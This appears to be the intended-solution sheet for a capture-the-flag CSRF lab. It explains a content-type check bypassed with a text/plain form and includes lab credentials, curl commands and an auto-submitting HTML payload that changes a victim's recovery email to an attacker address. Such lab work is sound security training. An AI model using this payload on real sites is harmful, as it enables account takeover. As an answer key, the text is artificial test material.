# CSRF — ContentTypeBypass · Prefsio (difficulty: medium)

`POST /account/recovery-email` changes the logged-in user's recovery email. Its "CSRF protection" (SEC-77) is a content-type check: requests with `application/x-www-form-urlencoded` or `multipart/form-data` are rejected. **But** for every other content type the raw body is JSON-parsed leniently — including `text/plain` and missing content types. The classic `<form enctype="text/plain">` trick sends arbitrary JSON as a *simple request* (no preflight, no CORS check) and sails straight through: content-type is not a CSRF token. (A cross-site `fetch` with `Content-Type: application/json` would trigger a preflight — that part of the protection does hold in a real browser.)

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`, open http://victim.target.lab:8119/account — note the JSON-only API and its content-type guard.
2. Confirm both sides: a normal form encoding is rejected (`curl -si -b "sid=<sid>" -d "recovery_email=attacker@evil.example" http://victim.target.lab:8119/account/recovery-email` → 403), but `curl -si -b "sid=<sid>" -H "Content-Type: text/plain" -d '{"recovery_email":"attacker@evil.example"}' http://victim.target.lab:8119/account/recovery-email` succeeds.
3. Store the artifact on the exploit server: `<form action="http://victim.target.lab:8119/account/recovery-email" method="POST" enctype="text/plain"><input name='{"recovery_email":"attacker@evil.example","ignore":"' value='x"}'></form><script>document.forms[0].submit()</script>` (the crafted name/value make the whole body valid JSON).
4. Trigger the victim bot — send the JSON body as a raw string (no JSON content-type, like the cross-site form): `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"POST","body":"{\"recovery_email\":\"attacker@evil.example\"}"}'`
5. `curl http://collector.target.lab:8119/verify` → flag (innocent's `recovery_email` row changed).

Flag: `DSLTV{CSRF-ContentTypeBypass-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
